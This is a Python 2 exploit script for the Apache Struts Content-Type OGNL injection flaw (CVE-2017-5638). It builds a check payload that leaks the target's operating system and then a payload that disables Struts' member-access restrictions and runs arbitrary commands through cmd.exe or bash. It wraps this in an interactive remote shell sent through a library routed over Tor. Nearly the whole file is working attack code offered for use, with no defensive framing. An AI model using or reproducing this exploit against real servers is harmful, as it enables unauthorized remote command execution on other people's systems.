import sys
from DreamStorm import DreamStorm
from DreamStorm.lib.Color import Color

class cve_2017_5638:
    def __init__(self):
        self.counter = 0
        self.hack_text = "vulnerable_system"
        self.seperator = "nmcdkjslkiweurjdskfl"

    def generate_check_payload(self):
        payload  = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#os=@java.lang.System@getProperty('os.name'))."
        payload += "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('{}', #os))".format(self.hack_text)
        payload += "}"
        return payload

    def generate_exploit_payload(self,cmd):
        cmd = "echo {} && {} && echo {}".format(self.seperator,cmd,self.seperator)
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='{}').".format(cmd)
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"
        return payload

    def callback(self, package, page, headers):
        self.counter += 1
        if self.counter == 1:
            if headers.get(self.hack_text):
                print "{} is {}vulnerable{} and the system is using {} !".format(package["url"],Color.red,Color.normal,headers[self.hack_text])
            else:
                print "{} is {}not vulnerable{}".format(package["url"],Color.aquamarine,Color.normal)
                return None
        else:
            print page.partition(self.seperator)[2].partition(self.seperator)[0]
        cmd = raw_input("$ ")
        package = {
            "url": package["url"],
            "headers": { "Content-Type": self.generate_exploit_payload(cmd) }
        }
        return package

cve = cve_2017_5638()

dream = DreamStorm(3, tor=True)
dream.put({
    "url": "http://vulnerable.website.com",
    "headers": { "Content-Type": cve.generate_check_payload() }
})
dream.run(cve.callback)
